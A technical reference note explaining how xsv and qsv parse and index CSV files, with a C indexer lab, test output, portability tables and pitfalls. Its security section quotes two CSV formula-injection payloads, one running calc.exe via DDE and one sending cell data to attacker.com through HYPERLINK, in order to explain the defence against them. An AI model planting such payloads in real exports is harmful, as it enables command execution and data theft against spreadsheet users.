# xsv and qsv

> [!summary] Claim
> `xsv` and its modern fork `qsv` replace brittle, byte-blind Unix line pipelines with RFC 4180-compliant finite state machine parsing, constant-time byte-offset indexing, and vectorized execution engines that scale tabular CSV processing to millions of rows per second without loading datasets into physical memory.

Part of [Structured Data and HTTP](README.md) in [Shell and Unix Engineering](../README.md).

## TL;DR

- Mechanism: `xsv` and `qsv` parse with `csv-core`, which compiles its CSV NFA into a fixed-size table-driven Deterministic Finite Automaton (DFA) that tracks field and record boundaries, and they decouple variable-length tabular data from physical lines through companion `.csv.idx` binary byte-offset indices.
- Rule: Index CSV files prior to repeated slice, count, or parallel statistical operations to turn linear $O(N)$ sequential scans into a constant number of seeks (`xsv` `src/index.rs`).
- Trap: Relying on standard Unix line tools (`wc -l`, `cut`, `awk`, `join`) silently corrupts tabular datasets whenever fields contain RFC 4180 embedded newlines, escaped quotes, or unsorted keys.
- Portability fact: `IFS=, read -r` splits on every comma byte without CSV quote awareness, splitting quoted delimiters identically in bash, zsh, dash, ksh93, mksh, posh, and BusyBox ash (measured in the shell matrix).
- When not to use it: Avoid `xsv` and `qsv` for deeply nested hierarchical data, schema-less irregular JSON documents, or relational workloads requiring multi-table ACID transactions, where [[sqlite3-from-the-Shell]] or [[DuckDB-from-the-Shell]] are appropriate.

## Mental model

```mermaid
flowchart TD
  subgraph NaiveUnix["Naive Unix Line Tools (Broken on RFC 4180)"]
    U_IN["Input CSV with Quoted Newlines & Commas"] -->|"Split on 0x0A (Newline byte)"| U_LINE["Line Splitter (wc -l, cut, sed, awk)"]
    U_LINE -->|"Embedded newline splits single record"| U_ERR1["Fragmented Records & Bogus Row Counts"]
    U_LINE -->|"Embedded comma inside quotes splits field"| U_ERR2["Corrupted Columns & Shifted Fields"]
  end

  subgraph DFAEngine["xsv / qsv csv-core DFA Engine"]
    Q_IN["Raw Byte Stream (File or stdin)"] -->|"scan_and_copy fast path"| DFA["Fixed-Size Table-Driven DFA"]
    DFA -->|"Track Quotes, Commas, CRLF"| S_REC["Field Bytes + End Positions in Reusable Buffers"]
    S_REC --> Q_OUT["Normalized Tabular Stream / Operations"]
  end

  subgraph IndexArch["RandomAccessSimple Index Architecture (.csv.idx)"]
    IDX_GEN["Command: xsv index / qsv index"] -->|"One-pass sequential scan"| IDX_FILE["Binary Index File: (N + 1) x 8-byte uint64_t"]
    IDX_FILE -->|"Offsets 0 to N-1: Record Byte Offsets"| SEEK_SLICE["Constant-Time O(1) Seek to Slice Start via lseek(SEEK_SET)"]
    IDX_FILE -->|"Offset N: Total Record Count N"| SEEK_COUNT["Constant-Time O(1) Counting via lseek(-8, SEEK_END)"]
    IDX_FILE -->|"Chunk Offsets across CPU cores"| PARALLEL["Parallel Chunks via a Thread Pool"]
  end
```



The diagram contrasts naive Unix line utilities with the structured architecture of `xsv` and `qsv`.
Standard Unix line tools operate under the POSIX definition of a line, breaking input strictly on newline bytes (`0x0A`), which splits RFC 4180 multi-line records into fragmented rows and misaligns comma-delimited columns.
The `csv-core` parsing engine inside `xsv` and `qsv` compiles its CSV NFA into a fixed-size table-driven Deterministic Finite Automaton (DFA) that writes field bytes and field end positions into caller-supplied buffers, so parsing allocates no per-field strings (`csv-core` `src/reader.rs`).
A companion binary index file (`.csv.idx`) stores 64-bit big-endian byte offsets for every record alongside a trailing record count, allowing commands like `slice` and `count` to skip linear file traversal via direct seeks (`csv-index` `src/simple.rs`).
This persistent index enables parallel processing by partitioning the record range across worker threads (`xsv stats` uses the `threadpool` crate), transforming slow serial pipelines into multicore operations.

## How it works

Standard Unix text processing utilities operate under the POSIX line abstraction `(POSIX.1-2024 XBD 3.185)`, which defines a line as "a sequence of zero or more non-<newline> characters plus a terminating <newline> character".
Under `(POSIX.1-2024 XCU cut)`, `cut` extracts fields by splitting each physical line on a single character delimiter without awareness of quoting contexts.
Similarly, `(POSIX.1-2024 XCU awk)` defines `awk` record scanning around the record separator `RS` (defaulting to newline), splitting fields along `FS`.
However, the standard for Comma-Separated Values (RFC 4180 Section 2.6) states: "Fields containing line breaks (CRLF), double quotes, and commas should be enclosed in double-quotes."
Furthermore, RFC 4180 Section 2.7 specifies: "If double-quotes are used to enclose fields, then a double-quote appearing inside a field must be escaped by preceding it with another double quote."
When a record contains an embedded newline inside quotes, line-oriented utilities split the logical record into multiple disconnected records, permanently corrupting downstream aggregations.

### The csv-core Deterministic Finite Automaton (DFA)

To achieve high parsing performance without violating RFC 4180, Andrew Gallant designed `csv-core` around a table-driven Deterministic Finite Automaton (DFA).
`csv-core` itself contains two parsers: a readable NFA (`NfaState`, selected only through the `#[doc(hidden)]` debug option `ReaderBuilder::nfa`, documented as "always slower than the DFA") and a DFA that `build_dfa` compiles from it when the reader is built; `use_nfa` defaults to `false`, so the DFA is what runs (`csv-core` `src/reader.rs`).
`csv-core` replaces most per-byte branching with a precompiled transition table held inline in the `Dfa` struct (a fixed-size array, no heap allocation), indexed by the current state and the byte's equivalence class:

```text
next_state = trans[current_state + classes[input_byte]]
```

The table is small: input bytes collapse into at most 7 equivalence classes (`TRANS_CLASSES`), and 10 of the 13 NFA states appear in the DFA (`DFA_STATES`), so `trans` has 70 entries (`TRANS_SIZE`) (`csv-core` `src/reader.rs`).
The DFA states are:
1. `StartRecord` and `StartField`: The states at the beginning of a record or field, awaiting an initial byte.
2. `InField`: Active consumption of unquoted field content until a delimiter or line terminator is reached.
3. `InQuotedField`: Active consumption within enclosing double quotes, where commas and line breaks are treated as literal field data.
4. `InDoubleEscapedQuote` and `InEscapedQuote`: Entered when a double quote (respectively a configured escape byte) appears inside a quoted field; from `InDoubleEscapedQuote` the next byte decides whether it is another double quote (`""` escaping, back to `InQuotedField`) or a structural delimiter.
5. `InComment`, `EndFieldDelim`, `EndRecord`, and `CRLF`: Comment skipping, the "field parsed" final state, and the "record parsed" final states for LF, CR, or CRLF terminators; `EndFieldTerm`, `InRecordTerm`, and `End` exist only in the NFA.

To skip most table lookups on ordinary field text, `csv-core` employs a fast-path scanning function (`DfaClasses::scan_and_copy`), called whenever the DFA is in `InField` or `InQuotedField`.
This function copies contiguous bytes belonging to equivalence class 0, which is every byte (ASCII or not) that is not configured as a delimiter, quote, escape, terminator, or comment byte.
It is a simple scalar loop that checks one class-table entry per byte and copies it to the output buffer, making no state transitions until a structural byte appears.
The higher-level reader invokes `read_record(input, output, ends)`, which drives the DFA across input chunks, copies unescaped field bytes into `output`, and writes field end positions into the reusable `ends` buffer.
Because both buffers are supplied by the caller and reused across records (the `csv` crate's `read_byte_record` refills one `ByteRecord`), extracting fields requires no per-record heap allocation (`malloc`), avoiding allocator overhead on the hot path.

### The RandomAccessSimple Binary Index Architecture (.csv.idx)

CSV is fundamentally an unindexed, variable-length tabular stream; finding the $N$-th record in an unindexed CSV requires scanning every byte from offset 0 ($O(N)$ time complexity).
`xsv` and `qsv` solve this structural limitation using companion binary index files generated via `xsv index` or `qsv index`.
The index format, implemented in the `csv-index` crate under the `RandomAccessSimple` struct, uses a frozen binary layout ("This format will never change", `csv-index` `src/simple.rs`).
An index file for a CSV dataset containing $N$ logical records consists of exactly $N + 1$ 64-bit unsigned integers (`uint64_t`), serialized in big-endian byte order; the header row, if any, is indexed as record 0 like any other record:

```text
+-----------------------------------------------------------------+
| Offset 0 (uint64_t, BE): Starting byte offset of Record 0       |
+-----------------------------------------------------------------+
| Offset 1 (uint64_t, BE): Starting byte offset of Record 1       |
+-----------------------------------------------------------------+
| ...                                                             |
+-----------------------------------------------------------------+
| Offset N-1 (uint64_t, BE): Starting byte offset of Record N-1   |
+-----------------------------------------------------------------+
| Offset N (uint64_t, BE): Total record count N                   |
+-----------------------------------------------------------------+
```

The mathematical invariant governing index file size is strict:
$$\text{Index File Size} = (N + 1) \times 8 \text{ bytes}$$

Because each entry occupies exactly 8 bytes, indexing provides constant-time operations:
- Record Counting ($O(1)$): With an index present, `xsv count` does not parse the CSV data file.
It first compares the modification times of the CSV and index files (from `File::metadata`, an `fstat` `(POSIX.1-2024 XSH fstat)`) and refuses a stale index (`xsv` `src/config.rs`); `RandomAccessSimple::open` then seeks to 8 bytes before the end of `.csv.idx` (`SeekFrom::End(-8)`, an `lseek` `(POSIX.1-2024 XSH lseek)`), reads the integer with `byteorder`'s `read_u64::<BigEndian>` (the Rust counterpart of C's `be64toh()`), and `Indexed::count` subtracts 1 for the header row unless `--no-headers` is set (`xsv` `src/index.rs`).
The work is a constant number of system calls regardless of file size.
- Constant-Time Seek to a Slice ($O(1)$ to start, $O(K)$ to emit): To execute `xsv slice -s 500000 -l 10 data.csv`, `Indexed::seek` adds 1 to skip the header and reads the entry at position $500001 \times 8$ in `.csv.idx` to obtain start byte offset $B_{start}$.
It then seeks the CSV reader to $B_{start}$ and parses and rewrites the next 10 records through the CSV writer (`idx.byte_records().take(end - start)`), so it never reads an end offset and bypasses the preceding gigabytes of data entirely (`xsv` `src/cmd/slice.rs`).
The lab's `csv_indexer slice` is a simplified model that instead reads the end offset $B_{end}$ from entry $(M + K)$ and copies $(B_{end} - B_{start})$ raw bytes.
- Index Line Decoupling: The index tracks physical byte offsets, not line numbers ("This indexing format does not store the line numbers of CSV records", `csv-index` `src/simple.rs`).
If record 4 contains five embedded newlines within quotes, record 5 begins several physical lines below, yet its byte offset remains exact; only line numbers in later error messages become wrong.

### Multithreading via Index Chunking

Parallel execution on unindexed CSV files is not safely possible without a prior pass, because worker threads cannot identify record boundaries at arbitrary byte positions without knowing whether a preceding quote opened an unclosed field.
Once a `.csv.idx` index exists, `xsv` and `qsv` split the work across a thread pool: `xsv stats` computes `util::chunk_size(idx.count(), njobs)` and runs the chunks on the `threadpool` crate's `ThreadPool` (`xsv` `src/cmd/stats.rs`), and `qsv stats` also uses `threadpool::ThreadPool`, with Rayon used elsewhere in `qsv` (`qsv` `src/cmd/stats.rs`).
Given $T$ worker threads (configured via `xsv --jobs`, `QSV_MAX_JOBS`, or by default the number of logical processors), the total record count $N$ is divided into $T$ disjoint record chunks.
Each worker thread calculates its assigned slice $[t \cdot \frac{N}{T}, (t+1) \cdot \frac{N}{T})$, reads the starting byte offset from the index, seeks its own file descriptor directly to that offset, and processes records independently without synchronization locks until the per-chunk results are merged.
Scaling is sublinear in practice: `xsv`'s own benchmark on an 8-core, 16-thread i7-6900K shows `stats` at 1.09 seconds unindexed and 0.15 seconds indexed, about 7x (`xsv` `BENCHMARKS.md`).
Commands such as `xsv stats`, `xsv frequency`, `xsv split`, and `qsv`'s `frequency`, `schema`, `split`, and `stats` (all listed under `QSV_MAX_JOBS` in `qsv` `docs/ENVIRONMENT_VARIABLES.md`) utilize this architecture to process multi-gigabyte datasets across available CPU cores.

### Evolution from xsv to qsv

`xsv` was authored by Andrew Gallant in 2014 (repository created 2014-09-02) as a lean, high-performance toolkit focused on roughly 20 core operations (`cat`, `count`, `fixlengths`, `flatten`, `fmt`, `frequency`, `headers`, `index`, `input`, `join`, `partition`, `reverse`, `sample`, `search`, `select`, `slice`, `sort`, `split`, `stats`, `table`).
`xsv` is frozen at version 0.13.0: its README is headed "`xsv` is now unmaintained", points users to `qsv` or `xan`, and the GitHub repository is archived (as of 2026-11).
It is configured almost entirely through command-line flags; the one environment variable in `src/config.rs` is `XSV_TOGGLE_HEADERS=1`, which inverts header handling.
In December 2020 (the `dathere/qsv` repository was created 2020-12-11), Joel Natividad and the datHere team forked `xsv` to create `qsv` (version 29.0.0, released 2026-11-15, as of 2026-11), expanding the codebase into an enterprise data-wrangling engine supporting over 50 subcommands.
Major architectural enhancements in `qsv` include:
1. External Memory Sorting (`qsv extsort`):
`xsv sort` loads entire files into physical RAM ("Note that this requires reading all of the CSV data into memory", `xsv` `src/cmd/sort.rs`), so large inputs end with the kernel's out-of-memory killer terminating the process.
`qsv extsort` implements an external merge sort (built on the `ext-sort` crate) controlled by `--memory-limit` (default 20, meaning 20% of total memory), sorting in-memory chunks, spilling sorted runs to `--tmp-dir`, and merging the runs with one open temporary file and a read buffer of about 1 MB per chunk (`qsv` `src/cmd/extsort.rs`); the merge itself is a binary min-heap holding the head record of each sorted run (`BinaryHeapMerger`, `ext-sort` 0.1.5 `src/merger.rs`).
2. Vectorized Polars SQL Integration (`qsv sqlp` and `qsv joinp`):
`qsv` embeds the Polars DataFrame library and Apache Arrow memory format, enabling multithreaded SQL queries, `--non-equi` joins, and `--asof` time-series joins directly on CSV files without loading them into external database servers (`qsv` `src/cmd/joinp.rs`).
3. Dynamic Embedded Scripting (`qsv luau` and `qsv py`):
Embedding the Roblox Luau engine enables user-defined transformations with helper variables and indexed random access: assigning the special `_INDEX` variable in a script switches `qsv luau` to random access mode, which needs an index or a `qsv_autoindex()` call (`qsv` `src/cmd/luau.rs`).
4. Automatic Indexing (`QSV_AUTOINDEX_SIZE`):
When an input file size reaches `QSV_AUTOINDEX_SIZE` bytes, `qsv` automatically generates the companion `.csv.idx` file, and "stale indices are automatically updated regardless of this setting" (`qsv` `docs/ENVIRONMENT_VARIABLES.md`).
5. Environment Variable Hierarchy:
`qsv` supports global configuration via `.env` files and `QSV_*` environment variables (`QSV_DEFAULT_DELIMITER`, `QSV_RDR_BUFFER_CAPACITY`, `QSV_WTR_BUFFER_CAPACITY`, `QSV_MAX_JOBS`), all documented in `qsv` `docs/ENVIRONMENT_VARIABLES.md`.

## Numbers and limits

The following table documents architectural limits, default buffer allocations, and performance metrics for `xsv` and `qsv` (as of 2026-11).

| Parameter / Metric | Value | Constraint / Scope | Source |
| :--- | :--- | :--- | :--- |
| Index entry size | 8 bytes (`uint64_t`) | Big-endian byte offset per record | `csv-index` `src/simple.rs` |
| Index file size formula | $(N + 1) \times 8$ bytes | Exactly $N$ record offsets + 1 record count; the header row counts as a record | `csv-index` `src/simple.rs`; modeled by the lab indexer (`test 3`) |
| Max indexable records | $2^{64}-1$ records | Bounded by the `u64` count field (derived, not a documented limit) | `csv-index` `RandomAccessSimple` |
| Default reader buffer (`QSV_RDR_BUFFER_CAPACITY`) | 128 KiB (131,072 bytes) | Configurable via environment variable | `qsv` `docs/ENVIRONMENT_VARIABLES.md` (as of 2026-11) |
| Default writer buffer (`QSV_WTR_BUFFER_CAPACITY`) | 512 KiB (524,288 bytes) | Configurable via environment variable | `qsv` `docs/ENVIRONMENT_VARIABLES.md` (as of 2026-11) |
| `qsv extsort` default memory limit | 20% of total memory | Values below 50 are a percentage; values above 50 are MB | `qsv` `src/cmd/extsort.rs` usage text |
| `qsv extsort` max memory limit | 90% of total memory | Cap applied to MB values | `qsv` `src/cmd/extsort.rs` usage text |
| `extsort` merge buffer size | ~1 MB per chunk file | `RW_BUFFER_CAPACITY = 1_000_000`, read buffer per temporary run during merge | `qsv` `src/cmd/extsort.rs` |
| Single-core parse throughput (`xsv count`) | 413.76 MB/s | 1,000,000-row worldcitiespop subset, Intel i7-6900K (2018-era benchmark) | `xsv` `BENCHMARKS.md` |
| Indexed vs unindexed `xsv stats` | 303.42 MB/s vs 41.75 MB/s | Same dataset, 8 cores and 16 threads | `xsv` `BENCHMARKS.md` |
| Statistics columns (`xsv stats`) | 11 statistics | 8 by default (`type`, `sum`, `min`, `max`, `min_length`, `max_length`, `mean`, `stddev`) plus `median`, `mode`, `cardinality` with `--everything`, after the `field` column | `xsv` `src/cmd/stats.rs` (v0.13.0) |
| Statistics columns (`qsv stats`) | Up to 48 statistics | `MAX_STAT_COLUMNS = 49` output columns under `--everything`, including `field` | `qsv` `src/cmd/stats.rs` (v29.0.0) |
| Index staleness check | `xsv` errors; `qsv` re-indexes | `xsv` refuses when the CSV mtime is newer than the index mtime, compared in whole seconds (`util::last_modified` returns `FileTime::seconds_relative_to_1970`), so an edit within the same second as the index build is not detected | `xsv` `src/config.rs` and `src/util.rs`; `qsv` `docs/ENVIRONMENT_VARIABLES.md` |

## Portability

The table below contrasts CSV handling mechanisms and behavioral divergences across Unix shells, standard POSIX line utilities, and structured CSV engines.

| Implementation / Tool | Embedded Newline (`\n`) in Quotes | Quoted Comma Delimiter | `IFS=,` Parameter Splitting | Unsorted Key Joining | Memory Model |
| :--- | :--- | :--- | :--- | :--- | :--- |
| POSIX `sh` specification | `read` consumes one line, so a quoted newline splits the record `(POSIX.1-2024 XBD 3.185; XCU read)` | Splits field on delimiter `(POSIX.1-2024 XCU cut)` | Splits inside quotes `(POSIX.1-2024 XCU 2.6.5)` | `join` requires input sorted on the join field in the `LC_COLLATE` order `(POSIX.1-2024 XCU join)` | Streaming line-by-line |
| macOS `bash` 3.2.57 | Splits on `0x0A` | Splits on comma | Splits inside quotes (lab `test 7`) | N/A in the shell; macOS `join` drops rows (see below) | Streaming line-by-line |
| Current `bash` (5.2.37 in Debian 13) | Splits on `0x0A` | Splits on comma | Splits inside quotes (lab `test 7`) | N/A in the shell; uses the system `join` | Streaming line-by-line |
| `zsh` (native & `--emulate sh`) | Splits on `0x0A` | Splits on comma | Splits inside quotes in `read` (lab `test 7`); native zsh does not field split unquoted expansions | N/A in the shell; uses the system `join` | Streaming line-by-line |
| `dash` 0.5.12 | Splits on `0x0A` | Splits on comma | Splits inside quotes (lab `test 7`) | N/A in the shell; GNU `join` in Debian | Streaming line-by-line |
| `ksh93` (u+ / u+m) | Splits on `0x0A` | Splits on comma | Splits inside quotes (lab `test 7`) | N/A in the shell; uses the system `join` | Streaming line-by-line |
| `mksh` (R59) | Splits on `0x0A` | Splits on comma | Splits inside quotes (lab `test 7`) | N/A in the shell; uses the system `join` | Streaming line-by-line |
| `posh` 0.14.1 | Splits on `0x0A` | Splits on comma | Splits inside quotes (lab `test 7`) | N/A in the shell; GNU `join` in Debian | Streaming line-by-line |
| `BusyBox ash` 1.37.0 | Splits on `0x0A` | Splits on comma | Splits inside quotes (lab `test 7`) | No `join` in the Alpine 3.22 image (`join: not found`, status 127, measured in the shell matrix) | Streaming line-by-line |
| GNU coreutils (`cut`, `join`) | Splits on `0x0A` | Splits on comma (lab `test 2`) | N/A (External utility) | Warns `is not sorted`, still prints the pairable lines, then exits 1 with `join: input is not in sorted order` (coreutils 9.7, measured in the shell matrix) | Line buffer |
| BSD / macOS utilities | Splits on `0x0A` (lab `test 1`) | Splits on comma (lab `test 2`) | N/A (External utility) | Silently drops non-monotonic records and exits 0 (measured on the macOS host) | Line buffer |
| `xsv` (v0.13.0) | RFC 4180 DFA compliant | Preserves quoted commas | N/A (Standalone binary) | In-memory hash index of the second input's keys (arbitrary key order, `xsv` `src/cmd/join.rs`) | Streaming ($O(1)$) or In-Memory ($O(N)$ for sort) |
| `qsv` (v29.0.0) | RFC 4180 DFA compliant | Preserves quoted commas | N/A (Standalone binary) | In-memory hash join (`join`) or Polars join (`joinp`, with a `--streaming` output mode) | Streaming, External Merge, or Vectorized Arrow |

## Worked example

The test suite and verification harness for this note are located in [lab](../labs/09-xsv-and-qsv/).
The reference indexer harness demonstrates RFC 4180 state-machine parsing and binary index generation conforming to the `RandomAccessSimple` format; it is a hand-written `switch` model for teaching, not `csv-core`'s table-driven DFA, and the excerpt omits the lab's `realloc` growth and error handling:

```c
/* File: labs/09-xsv-and-qsv/csv_indexer.c (simplified excerpt) */
static int do_index(const char *csv_path, const char *idx_path) {
    int csv_fd = open(csv_path, O_RDONLY);
    size_t capacity = 1024, count = 0;
    uint64_t *offsets = malloc(capacity * sizeof(uint64_t));
    offsets[count++] = 0; /* Record 0 begins at byte 0 */

    uint8_t buffer[65536];
    uint64_t current_offset = 0;
    parser_state_t state = STATE_GROUND;
    ssize_t nread;

    while ((nread = read(csv_fd, buffer, sizeof(buffer))) > 0) {
        for (ssize_t i = 0; i < nread; i++) {
            uint8_t b = buffer[i];
            uint64_t byte_pos = current_offset + (uint64_t)i;
            switch (state) {
            case STATE_GROUND:
                if (b == '"') state = STATE_IN_QUOTED_FIELD;
                else if (b == '\n') offsets[count++] = byte_pos + 1;
                else if (b != ',' && b != '\r') state = STATE_IN_FIELD;
                break;
            case STATE_IN_FIELD:
                if (b == ',') state = STATE_GROUND;
                else if (b == '\n') { offsets[count++] = byte_pos + 1; state = STATE_GROUND; }
                break;
            case STATE_IN_QUOTED_FIELD:
                if (b == '"') state = STATE_QUOTE_IN_QUOTED;
                break;
            case STATE_QUOTE_IN_QUOTED:
                if (b == '"') state = STATE_IN_QUOTED_FIELD; /* Escaped quote: "" */
                else if (b == ',') state = STATE_GROUND;
                else if (b == '\n') { offsets[count++] = byte_pos + 1; state = STATE_GROUND; }
                else state = STATE_IN_FIELD;
                break;
            }
        }
        current_offset += (uint64_t)nread;
    }
    close(csv_fd);

    /* A final newline leaves an offset at EOF; drop that empty record */
    if (count > 1 && offsets[count - 1] == current_offset) count--;

    /* Serialize (N + 1) uint64_t entries in big-endian format */
    int idx_fd = open(idx_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    for (size_t i = 0; i < count; i++) {
        uint64_t be_val = htobe64(offsets[i]);
        write(idx_fd, &be_val, sizeof(be_val));
    }
    uint64_t be_count = htobe64(count);
    write(idx_fd, &be_count, sizeof(be_count));
    close(idx_fd);
    return 0;
}
```

The accompanying shell script demonstrates how naive line tools miscalculate records and corrupt columns:

```bash
# File: labs/09-xsv-and-qsv/xsv_probe.sh (simplified excerpt)
case "$mode" in
  naive-count)
    wc -l < "$1" | tr -d ' '
    ;;
  naive-cut)
    cut -d, -f"$2" "$1"
    ;;
  indexed-count)
    "$INDEXER" count "$1"
    ;;
  indexed-slice)
    "$INDEXER" slice "$1" "$2" "$3" "$4"
    ;;
  hash-join)
    awk -F, -v k1="$3" -v k2="$4" '
      NR == FNR { if (FNR > 1) rows[$k1] = $0; next }
      FNR == 1 { next }
      ($k2 in rows) { printf "%s,%s\n", rows[$k2], $0 }
    ' "$1" "$2"
    ;;
esac
```

Executing the Bats suite confirms the failure modes of naive utilities and validates constant-time indexing (output captured from one run on the macOS host, 2026-11-27); `test 6` asserts the exact hash-join output first, then that line `join` pairs fewer than the 3 data rows (1 on the macOS host), and skips that last step where `join` is missing, as in the Alpine image:

```
$ bats labs/09-xsv-and-qsv/xsv_qsv.bats
1..7
ok 1 naive line count fails on multi-line quoted CSV records
ok 2 naive cut splits on delimiter inside quoted field
ok 3 indexed-index creates binary (N+1)*8 byte index layout
ok 4 indexed-slice extracts exact record range using byte offsets
ok 5 validate-index detects and rejects truncated index file
ok 6 hash-join succeeds on unsorted data where line join fails
ok 7 shell IFS comma splitting splits inside double quotes across all families
```

## Pitfalls

> [!warning] Multi-Line Record Fragmentation in Naive Unix Pipelines
> Trigger: Piping CSV data containing embedded CRLF or LF characters within double quotes into line-oriented utilities (`grep`, `cut`, `awk`, `sed`, `wc -l`).
> Symptom: Physical line counts exceed logical record counts; downstream utilities read fragmented lines as corrupted records, resulting in silent column misalignment or arithmetic aggregation errors.
> Fix: Process datasets with `xsv` or `qsv` (`xsv select`, `qsv search`); if standard line tools are mandatory downstream, replace embedded line breaks inside fields with a regex replacement such as `qsv replace '\r?\n' ' '` (`qsv fmt` only changes delimiters, quoting, and terminators, so it cannot remove them) or transcode the data into line-delimited JSON using `qsv tojsonl`.
> Primary source: RFC 4180 Section 2.6; POSIX.1-2024 XBD 3.185; `qsv` `src/cmd/fmt.rs` usage text.

> [!warning] Out-Of-Memory Process Termination on In-Memory Sorting
> Trigger: Executing `xsv sort` or `xsv join` on a CSV dataset whose raw size exceeds available physical memory.
> Symptom: `xsv sort` collects every record into one `Vec` (`rdr.byte_records().collect()`), and `xsv join` loads the second input's keys and record offsets into an in-memory hash index; when that exceeds memory, the Linux Out-Of-Memory (OOM) killer terminates the process with `SIGKILL` (the shell reports exit status 137, 128 + 9).
> Fix: Use `qsv extsort` with `--memory-limit` to perform an external merge sort that spills runs to disk, or invoke `qsv joinp` to execute Polars joins, whose `--streaming` flag writes the result batch by batch instead of collecting it in memory first, trading speed for lower memory (`qsv` `src/cmd/joinp.rs` usage text).
> Primary source: `xsv` `src/cmd/sort.rs` and `src/cmd/join.rs`; `qsv` `src/cmd/joinp.rs`; Linux kernel `mm/oom_kill.c`.

> [!warning] Stale Byte-Offset Indexing After In-Place File Mutation
> Trigger: Modifying or appending records to a CSV file in-place without removing or updating its accompanying `.csv.idx` index file, in a way that leaves the CSV's modification time no newer than the index's (a rewrite within the same timestamp tick, `cp -p`, `touch -r`, or a restore that preserves mtimes), or reading the index with a custom tool that does not compare mtimes.
> Symptom: When the CSV's mtime is newer, `xsv` refuses with "The CSV file was modified after the index file. Please re-create the index." (`xsv` `src/config.rs`) and `qsv` re-indexes automatically; when the mtime check is defeated, a reader seeks to stale byte offsets, landing in the middle of field text and outputting corrupted records or failing with UTF-8 decoding errors.
> Fix: Rely on `qsv`'s automatic refresh of stale indexes ("stale indices are automatically updated regardless of this setting", `qsv` `docs/ENVIRONMENT_VARIABLES.md`) or `xsv`'s refusal, but do not trust mtime alone: always purge `.csv.idx` files after in-place file modifications or write output to new files using atomic renames.
> Primary source: `xsv` `src/config.rs`; `qsv` `docs/ENVIRONMENT_VARIABLES.md`; POSIX.1-2024 XSH `fstat`.

> [!warning] CSV Formula Injection and Dynamic Data Exchange (DDE) Attacks
> Trigger: Exporting unsanitized user-supplied strings directly into CSV format when fields begin with formula trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`, `\n`, or their full-width variants in some locales, per OWASP).
> Symptom: When an administrative user opens the exported CSV file in Microsoft Excel or LibreOffice Calc, the application interprets cells as active formulas, executing arbitrary local commands via DDE or exfiltrating data via `=HYPERLINK` (CVE-2014-3524: Apache OpenOffice Calc before 4.1.1 executes commands from a crafted spreadsheet; CVE-2025-55745: CSV injection in the Quick Export of UnoPim 0.3.0 and earlier, published 2025-08-22).
> Fix: Follow OWASP: wrap each field in double quotes, prepend a single quote `'`, and double any embedded double quote, noting OWASP's warning that Excel can drop these protections when a file is saved and reopened; or transcode tabular exports to strongly typed binary formats such as Parquet (`qsv to parquet`, `qsv` `src/cmd/to.rs`).
> Primary source: OWASP CSV Injection Guide; CVE-2014-3524; CVE-2025-55745.

> [!warning] Silent Record Drop in POSIX join on Unsorted Keys
> Trigger: Invoking `join -t,` on CSV files whose key fields are not lexicographically sorted according to the current `LC_COLLATE` locale.
> Symptom: Under GNU `join` (coreutils 9.7), the utility warns `join: users.csv:3: is not sorted: 10,alice`, still prints the lines it could pair, and exits 1 with `join: input is not in sorted order`; under macOS `join`, the utility silently skips non-monotonic records, outputting a partial join with exit status 0 (both measured in the shell matrix on the lab's `users.csv` and `orders.csv`).
> Fix: Use `xsv join` or `qsv join`, which build an in-memory hash index on the second input's join keys and operate correctly on arbitrary row ordering without prior external sorting.
> Primary source: POSIX.1-2024 XCU join; GNU coreutils `join.c`; `xsv` `src/cmd/join.rs`.

> [!warning] Index Truncation Misreads on Abrupt Process Interruption
> Trigger: Terminating an indexing process (`xsv index` or `qsv index`) via `SIGKILL` or out-of-space conditions before the index file is completely written.
> Symptom: A partial `.csv.idx` file is left on disk where the file size is not a multiple of 8 bytes or does not match $(N+1) \times 8$; `RandomAccessSimple::open` trusts the last 8 bytes as the record count without checking the file length (`csv-index` `src/simple.rs`), so later seeks use a garbage count and offsets; `RandomAccessSimple::get` bounds-checks only against that count, and a read past the end of the file surfaces as an I/O error from `read_u64`, not a panic (`csv-index` `src/simple.rs`).
> Fix: Modern `qsv` builds the index "into a temp beside" the final path and renames it "into place only once the index is complete" (`qsv` `src/cmd/index.rs`); in custom pipelines, validate index file length `(size % 8 == 0 && size == (N+1)*8)` before querying, as the lab's `validate` mode does (`test 5`).
> Primary source: `qsv` `src/cmd/index.rs`; `csv-index` `src/simple.rs`.

## Security and robustness

Tabular CSV data processing presents distinct security, memory, and concurrency considerations:

1. Memory Safety via Rust:
Both `xsv` and `qsv` are implemented in memory-safe Rust.
This architectural choice eliminates buffer overflows, off-by-one boundary overruns, use-after-free conditions, and format string vulnerabilities that historically affected legacy C-based text manipulation tools.
Safe Rust cannot overrun a buffer: the `scan_and_copy` loop above indexes `input` and `output` with bounds checks, and `csv-core` `src/reader.rs` and `src/writer.rs` contain no `unsafe` block (as of 2026-11); in `qsv` `src/cmd/extsort.rs` the only `unsafe` blocks are the `libc::getrlimit` and `setrlimit` calls that raise the open-file limit.

2. Denial-of-Service (DoS) and Resource Exhaustion:
In standard streaming mode, `xsv` maintains an $O(1)$ constant memory footprint relative to the input file size.
However, operations that inherently require global dataset materialization buffer data in RAM: `xsv sort` holds every record, and `xsv stats` with `--median`, `--mode`, `--cardinality`, or `--everything` must retain per-column values, indexed or not (`xsv` `src/cmd/stats.rs`).
Supplying unbounded CSV input streams (such as decompression bombs or streaming API endpoints) to unindexed `xsv` commands exhausts system swap and triggers kernel out-of-memory killing.
Robust pipelines bound memory consumption using `qsv extsort --memory-limit` or stream through [[Miller]].

3. Formula Injection (Spreadsheet DDE Exploitation):
CSV is a plain-text serialization format that contains no inherent data type definitions.
When web services export user-controlled text directly into CSV files, attackers inject formula payloads such as `=cmd|'/c calc.exe'!A1` or `=HYPERLINK("http://attacker.com/leak?d="&A2)`.
When opened by client applications, spreadsheet engines evaluate these formulas under the local user credentials.
Engineers must sanitize export streams by quoting fields and neutralizing formula prefixes before exposing CSV files to end users (OWASP CSV Injection).

4. Non-UTF-8 Encoding and Dirty Data Handling:
The Rust `csv` crate validates UTF-8 only in its `StringRecord` API; `ByteRecord` accepts arbitrary bytes, and `xsv` commands such as `select` and `search` read `ByteRecord`s (`xsv` `src/cmd/select.rs`, `src/cmd/search.rs`), so they pass invalid sequences through unvalidated.
To maintain pipeline robustness against legacy encodings (such as Windows-1252 or Latin-1), `qsv` provides the `qsv input` command.
